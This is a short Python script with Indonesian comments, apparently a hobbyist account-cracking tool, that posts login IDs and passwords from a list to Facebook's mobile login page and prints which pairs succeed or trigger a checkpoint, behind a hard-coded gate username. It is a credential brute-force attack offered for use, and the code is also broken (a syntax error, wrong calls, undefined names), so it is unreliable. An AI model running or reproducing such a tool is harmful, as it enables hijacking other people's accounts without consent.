#!/usr/python3
#Jangan recode bang pliss
#Hargai pembuat bang
#Tinggal make aja apa susahnya sih ?
#Arigato gozaimasu yg udh make >//<
#Uwwu >//<


import requests
import time
import os

def baner():
    os.system("clear")
    os.system("sleep 2")
    os.system("figlet OFFI | lolcat")
    os.system("sleep 2")
    print ("  ")
    print ("Author : D@rk_Devil#666")
    print ("  WA   : 089652884613")
    print ("  ")
    
def Mulai():
    id = input("[?] ID List  : ")
    pw = input("[?] Password : ")
    
    link = "https://m.facebook.com/login.php"
    data = {"email":id, "pass":pw}
    
def brute(id, pw):
    link = "https://m.facebook.com/login.php"
    data = {"email":id, "pass":pw}
    r = requests.post(link, data=data)
    
    if "m_sess" in r.url:
        
        print ("[√] Berhasil"+ id +">>"+ pw)
        
    elif "checkpoint" in r.url:
        
        print ("[!] Checkpoint"+ id +">>"+ pw)
        
    else:
        
        print ("[!] Gagal"+ id)
    
def list(open, pw):
    file = open(open, "r").readlines()
        for i in file:
            brute(i.strip().pw)

def menu():
    
    kata = input("[?] Username : ")
    
    if kata == "HelloSatan":
        
        print ("[√] Sukses...")
        os.system("sleep 2")
        os.system("clear")
        baner()
        Mulai()
        
    elif kata == "":
        
        print ("[!] Username Tidak boleh kosong")
        os.system("clear")
        menu
        
    else:
        print ("[!] Login gagal")
        os.system("exit")
        
try:
    
    list(id,pw)
    
except:
    
    exit()
    
if __name__ == "__main__":
    menu()